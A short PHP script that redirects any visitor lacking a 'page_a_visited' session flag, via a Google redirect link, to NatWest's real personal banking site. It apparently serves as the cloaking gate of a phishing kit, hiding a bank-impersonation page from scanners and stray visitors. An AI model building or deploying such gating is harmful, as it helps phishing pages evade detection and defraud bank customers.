<?php
session_start();
if(!isset($_SESSION['page_a_visited'])){
header("Location: https://www.google.ru/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiVy-zEiL_JAhXBkSwKHSLMAHUQFggbMAA&url=https%3A%2F%2Fpersonal.natwest.com%2F&usg=AFQjCNEwiAcYb-gv7DrpPno4YjO4Tk7tQQ&bvm=bv.108538919,d.bGg");
die();
}
?>